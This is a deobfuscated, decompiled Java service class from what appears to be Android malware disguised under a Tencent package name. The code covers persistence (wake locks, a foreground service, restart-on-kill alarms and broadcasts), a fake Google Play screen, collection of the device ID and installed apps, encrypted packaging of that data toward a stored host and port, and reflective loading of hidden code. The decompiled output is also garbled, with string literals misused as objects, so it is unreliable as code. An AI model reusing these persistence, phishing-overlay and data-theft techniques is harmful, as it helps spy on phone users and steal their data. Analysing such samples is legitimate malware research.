package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: PersistentService
 * Original: Lcom/tencent/entitledoswimmingo21;
 */
public class PersistentService extends Service {

    // === FIELDS ===
     PowerManager$WakeLock wakeLock;

    // === METHODS ===

    public void Constructor() {
        // new Service()
        v0 = 0;
        v1.wakeLock = 0;
        return;
    }

    public static void FPPAGE(String param0) {
        v0 = MainBackgroundService.app_tunesxconcerningn1011_Context;
        return;
    }

    private void LOGIT(Context param0, Intent param1) {
        v0 = "com.tencent.tunesxconcerningn103";
        v1 = 0;
        Class.forName("com.tencent.tunesxconcerningn103");
        // goto (branch)
        "com.tencent.tunesxconcerningn103".printStackTrace();
        "com.tencent.tunesxconcerningn103".newInstance();
        // goto (branch)
        v2.printStackTrace();
        // goto (branch)
        v2.printStackTrace();
        v2 = 0;
        v3 = 2;
        v4 = new Class[][2];
        v5 = Context.class;
        v6 = 0;
        v4[0] = v5;
        v5 = Intent.class;
        v7 = 1;
        v4[1] = v5;
        v5 = "U3RhcnROZXdTY2Fu";
        DataPackagingEngine.grhcriticismzfailedd31("U3RhcnROZXdTY2Fu");
        "com.tencent.tunesxconcerningn103".getDeclaredMethod("U3RhcnROZXdTY2Fu", v4);
        // goto (branch)
        "com.tencent.tunesxconcerningn103".printStackTrace();
        "com.tencent.tunesxconcerningn103"[0] = v9;
        "com.tencent.tunesxconcerningn103"[1] = v10;
        0.invoke(v2, "com.tencent.tunesxconcerningn103");
        // goto (branch)
        v9.printStackTrace();
        // goto (branch)
        v9.printStackTrace();
        return;
    }

    public static void StartScreen(String param0) {
        v0 = MainBackgroundService.app_tunesxconcerningn1011_Context;
        if (v0 == null || v0 == 0) { // goto +71
        v0 = "on:";
        v1 = v6.startsWith("on:");
        v1 = "key";
        v2 = 8388608; // 0x800000
        v3 = 268435456; // 0x10000000
        if ("on:" == null || "on:" == 0) { // goto +29
        v0 = 1;
        MainBackgroundService.FO_tunesxconcerningn1011_RSC = 1;
        v4 = MainBackgroundService.app_tunesxconcerningn1011_Context;
        v5 = FakeGooglePlayActivity.class;
        // new Intent(v4, v5)
        1.addFlags(v3);
        1.addFlags(v2);
        1.putExtra("key", v6);
        v6 = MainBackgroundService.app_tunesxconcerningn1011_Context;
        v6.startActivity(1);
        // goto (branch)
        v6 = 0;
        MainBackgroundService.FO_tunesxconcerningn1011_RSC = 0;
        v4 = FakeGooglePlayActivity.class;
        // new Intent(1, v4)
        0.addFlags(v3);
        0.addFlags(v2);
        0.putExtra("key", "off");
        "off".startActivity(0);
        return;
    }

    public static void openlink(String param0) {
        v0 = MainBackgroundService.app_tunesxconcerningn1011_Context;
        if (v0 == null || v0 == 0) { // goto +24
        v0 = new Handler();
        v1 = Looper.getMainLooper();
        // new Handler(v1)
        v1 = new PersistentService$2();
        // new PersistentService$2(v2)
        v0.post(v1);
        // goto (branch)
        v2.printStackTrace();
        return;
    }

    public static void p(Context param0) {
        v0 = "NPO";
        v1 = "NHO";
        v2 = "NNA";
        v3 = "";
        v5 = v7.getContentResolver();
        v5 = "android_id";
        Settings$Secure.getString(v4, "android_id");
        // new StringBuilder("")
        "android_id".append(v4);
        "android_id".toString();
        // goto (branch)
        InstalledAppsScanner.GD_tunesxconcerningn108_I(v7);
        // new ArrayList()
        MainBackgroundService.L_tunesxconcerningn1011_i = "android_id";
        // new ArrayList()
        MainBackgroundService.L_tunesxconcerningn1011_cl = "android_id";
        My_tunesxconcerningn10_Settings.read(v7, "NNA", "");
        "android_id".length();
        if ("android_id" <= 0) { // goto +10
        My_tunesxconcerningn10_Settings.read(v7, "NNA", "android_id");
        MainBackgroundService.CLINAME = "NNA";
        // new StringBuilder()
        "NNA".append("android_id");
        "NNA".append("|");
        "NNA".append(v4);
        v4 = "NNA".toString();
        v4 = InstalledAppsScanner.FTX0;
        // goto (branch)
        v4 = "";
        v6 = DataPackagingEngine.grhcriticismzfailedd31("|");
        v6 = MainBackgroundService.tunesxconcerningn1011_Port;
        DataPackagingEngine.grhcriticismzfailedd31(v6);
        DataPackagingEngine.dit(v7, "NNA", v4);
        My_tunesxconcerningn10_Settings.read(v7, "NHO", "");
        "NNA".length();
        if ("NNA" <= 0) { // goto +12
        DataPackagingEngine.grhcriticismzfailedd31("NNA");
        My_tunesxconcerningn10_Settings.read(v7, "NHO", "NNA");
        My_tunesxconcerningn10_Settings.read(v7, "NPO", "");
        "NHO".length();
        if ("NHO" <= 0) { // goto +12
        DataPackagingEngine.grhcriticismzfailedd31("NHO");
        v0 = My_tunesxconcerningn10_Settings.read(v7, "NPO", "NHO");
        DataEncryptionEngine.traditionhtahoem37("|", v6, v7);
        v0 = 1;
        v1 = 0;
        1[0] = v7;
        v7 = new PersistentService$ta();
        // new PersistentService$ta()
        v7.execute(1);
        return;
    }

    public static void showToast(String param0) {
        v0 = MainBackgroundService.app_tunesxconcerningn1011_Context;
        if (v0 == null || v0 == 0) { // goto +19
        v0 = new Handler();
        v1 = Looper.getMainLooper();
        // new Handler(v1)
        v1 = new PersistentService$1();
        // new PersistentService$1(v2)
        v0.post(v1);
        return;
    }

    public IBinder onBind(Intent param0) {
        v1 = 0;
        return 0;
    }

    public void onCreate() {
        v8.onCreate();
        v0 = v8.getApplicationContext();
        MainBackgroundService.app_tunesxconcerningn1011_Context = v0;
        v1 = v8.getApplicationContext();
        v1 = "Battery";
        v2 = 18000;
        DataPackagingEngine.phonixeffect(v0, "Battery", 18000, v3);
        v0 = "power";
        v2 = v8.getSystemService("power");
        v2 = 1;
        if ("Battery" != null && "Battery" != 0) { // goto +10
        "power".newWakeLock(1, "PeriSecure:MyWakeLock");
        v8.wakeLock = "power";
        if ("power" == null || "power" == 0) { // goto +13
        "power".isHeld();
        if ("power" != null && "power" != 0) { // goto +7
        "power".acquire();
        v3 = v8.getApplicationContext();
        DataPackagingEngine.p_tunesxconcerningn103_r = "01110001";
        v3 = 26;
        if ("01110001" < 26) { // goto +27
        "01110001".charAt(1);
        if ("01110001" != 1) { // goto +17
        v1 = DataPackagingEngine.Foreground("power", "Worker", "Workers");
        if ("power" == null || "power" == 0) { // goto +7
        v1 = 9594;
        v8.startForeground(9594, "power");
        InstalledAppsScanner.FTX0 = "sysdata";
        InstalledAppsScanner.FTX1 = "appdata";
        InstalledAppsScanner.FTX2 = "configrs";
        InstalledAppsScanner.FTX3 = "sysinfo";
        v2 = 8;
        v3 = 15;
        v4 = 1;
        v6 = TimeUnit.MINUTES;
        v7 = new ArrayBlockingQueue();
        // new ArrayBlockingQueue(9594)
        ThreadPoolExecutor.<init>(...);
        DataPackagingEngine.e_tunesxconcerningn103_xc = "sysinfo";
        PersistentService.p(v8);
        return;
    }

    public void onDestroy() {
        v4.onDestroy();
        v0 = 0;
        DataPackagingEngine.s_tunesxconcerningn103_f0 = 0;
        v1 = v4.getApplicationContext();
        v1 = "iamdone";
        v2 = 180000;
        DataPackagingEngine.phonixeffect(0, "iamdone", 180000, v3);
        v4.getApplicationContext();
        // new Intent("iamdone", 180000)
        v1 = 0.setAction("RestartSensor");
        v4.sendBroadcast(0);
        v1 = 1;
        if (0 == null || 0 == 0) { // goto +13
        0.isHeld();
        if (0 != 1) { // goto +7
        0.release();
        v4.stopForeground(1);
        return;
    }

    public int onStartCommand(Intent param0, int param1, int param2) {
        v1 = 1;
        return 1;
    }

    public void onTaskRemoved(Intent param0) {
        v1 = v8.getApplicationContext();
        v1 = "Scanner";
        v2 = 180000;
        DataPackagingEngine.phonixeffect(v0, "Scanner", 180000, v3);
        v0 = new Intent();
        v8.getApplicationContext();
        v8.getClass();
        // new Intent("Scanner", 180000)
        v8.getPackageName();
        v0.setPackage("Scanner");
        v2 = v8.getApplicationContext();
        v2 = 1073741824; // 0x40000000
        v3 = 1;
        PendingIntent.getService("Scanner", 1, v0, 180000);
        v8.getApplicationContext();
        v6 = "Scanner".getSystemService("alarm");
        SystemClock.elapsedRealtime();
        v6 = 1000;
        v2 = 3;
        "Scanner".set(3, v4, v5, v0);
        v0 = v8.wakeLock;
        v1 = 0;
        v0 = v0.equals(0);
        if (v0 != null && v0 != 0) { // goto +15
        v0 = v8.wakeLock;
        v0 = v0.isHeld();
        if (v0 != 1) { // goto +7
        v0 = v8.wakeLock;
        v0.release();
        v8.onTaskRemoved(v9);
        return;
    }
}
